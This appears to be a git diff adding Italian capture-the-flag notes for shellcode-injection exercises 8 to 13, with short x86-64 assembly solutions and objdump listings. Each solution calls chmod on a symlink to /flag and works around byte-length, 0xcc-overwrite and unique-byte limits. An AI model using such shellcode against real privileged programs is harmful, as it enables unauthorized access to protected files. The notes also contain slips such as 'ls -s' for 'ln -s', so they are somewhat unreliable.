@@ -350,22 +350,151 @@ flag:
 3. infine ad `rdi` assegnamo l'indirizzo della shell.
 
 ## Esercizio 8
+Questo esercizio si basa sul fatto di poter leggere solo 0x12 bytes in ingresso, che sono 18 byte.
+Per poter far ciò si può utilizzare i link simbolici, infatti nel terminale scrivendo `ls -s /flag abc` si crea un link simbolico tra il file `flag` e il file `abc` per cui se si vanno a modificare i permessi di lettura/scrittura/esecuzione di `abc` ed essendo che ha il contenuto di `flag` ci basterà poi leggere `abc`
+```
+.intel_syntax noprefix
+.global _start
 
+_start:
+
+    #file
+    push 0x636261
+    push rsp
+    pop rdi
+    
+    #mode 
+    push 6
+    pop rsi
+    #syscall 90
+    push 0x5a
+    pop rax
+
+    syscall
+```
 
 ## Esercizio 9
+Questo esercizio invece ha questa difficoltà "This challenge modified your shellcode by overwriting every other 10 bytes with 0xcc. 0xcc, when interpreted as an
+instruction is an `INT 3`, which is an interrupt to call into the debugger. You must avoid these modifications in your shellcode."
+Questa modifica va a sovrascrivere il nostro codice ogni 10 byte, quindi prendendo l'esecuzione dell'esercizio precedente si eseguono 2 step per risolvere il nuovo esercizio
+1. Prima si va a controllare con objdump sul codice dove inizierà a sovrascrivere byte, tenendo conto che la jmp occupa 2 byte dopo `pop rdi` si arriva a 9 
+2. Adesso sappiamo che si deve inserire delle `nop` per 11 bytes, 10 per saltare la sovrascrittura del codice e 1 perchè serve un byte di padding.
+   Basterà utilizzare `.rept` per inserire le nop e mettere un jmp a dopo le nop, così da non sovrascrivere il nostro codice. 
 
+```
+.intel_syntax noprefix
+.global _start
+
+_start:
+
+    #file
+    push 0x666564
+    push rsp
+    pop rdi
+    
+    jmp continue
+
+    .rept 11 
+        nop 
+    .endr
+
+    continue:
+    #mode 
+    push 6
+    pop rsi
+    #syscall 90
+    push 0x5a
+    pop rax
+
+    syscall
+
+```
 
 ## Esercizio 10
-
+L'esercizio prevede di stare attenti "This challenge just sorted your shellcode using bubblesort. Keep in mind the impact of memory endianness on this sort" 
+Non l'ho capito a fondo, in quanto eseguendo il codice per l'esercizio 8 come debug di test si è risolto l'esercizio
 
 ## Esercizio 11
-
+Questo esercizio dovrebbe avere la stessa dinamica dell'esercizio precedente, con l'aggiunta di non poter utilizzare output perchè bloccati.
+Anche per questo esercizio basta eseguire la soluzione dell'esercizio 8 per risolvere.
 
 ## Esercizio 12
+Quest'altro esercizio dovrebbe essere più complicato di quelli precedenti ma si risolve sempre basandosi sul metodo dell'esercizio 8.
+Infatti quello che viene richiesto è che ogni byte sia unico nello shellcode. 
+Analizzando lo shellcode attuale dell'esercizio 8 avremo 
+```
+0000000000401000 <_start>:
+  401000:       68 61 62 63 00          push   0x636261
+  401005:       54                      push   rsp
+  401006:       5f                      pop    rdi
+  401007:       6a 06                   push   0x6
+  401009:       5e                      pop    rsi
+  40100a:       6a 5a                   push   0x5a
+  40100c:       58                      pop    rax
+  40100d:       0f 05                   syscall
+```
+Si può notare che stiamo eseguendo la `push` 2 volte, per cui si usa lo stesso byte 2 volte, basterà sostituire `push` con `mov` facendo attenzione al registro, infatti
+se utilizziamo `mov rsi, 6` utilizzeremo 64 bit, di cui 48 nulli per cui il programma leggendo un altro byte 0 terminerà, bensì dovremo usare `mov sil, 6` così da modificare solo gli ultimi 8 bit per non ripetere byte nulli.
+Il codice quindi sarà così
+```
+.intel_syntax noprefix
+.global _start
 
+_start:
 
+    #file
+    #0x653231 -> file "12e" 
+    push 0x653231
+    push rsp
+    pop rdi
+    
+    #mode 
+    mov sil, 6
+    #syscall 90
+    push 0x5a
+    pop rax
+
+    syscall
+```
+e questo sarà il suo dump 
+```
+0000000000401000 <_start>:
+  401000:       68 31 32 65 00          push   0x653231
+  401005:       54                      push   rsp
+  401006:       5f                      pop    rdi
+  401007:       40 b6 06                mov    sil,0x6
+  40100a:       6a 5a                   push   0x5a
+  40100c:       58                      pop    rax
+  40100d:       0f 05                   syscall
+```
 ## Esercizio 13
+La difficoltà di questo esercizio è che l'input preso in ingresso è di 0xc byte cche sono 12 byte.
+La risoluzione di questo esercizio da parte mia si basa sempre sull'esercizio 8, solamente che si vanno ad applicare registri più piccoli per `rsi` e `rsa` utilizzando `sil` e `al` 
+```
+.intel_syntax noprefix
+.global _start
 
+_start:
+    #il file sarà f -> 0x66
+    push 0x66
+    push rsp
+    pop rdi
+    mov sil, 6
+    mov al, 90
+    syscall
 
+```
+Così facendo i 2 registri utilizzano la quantità minima di registri per caricare i dati.
+*Dump*
+```
+0000000000401000 <_start>:
+  401000:       6a 66                   push   0x66
+  401002:       54                      push   rsp
+  401003:       5f                      pop    rdi
+  401004:       40 b6 06                mov    sil,0x6
+  401007:       b0 5a                   mov    al,0x5a
+  401009:       0f 05                   syscall 
+```
 ## Esercizio 14
+
 
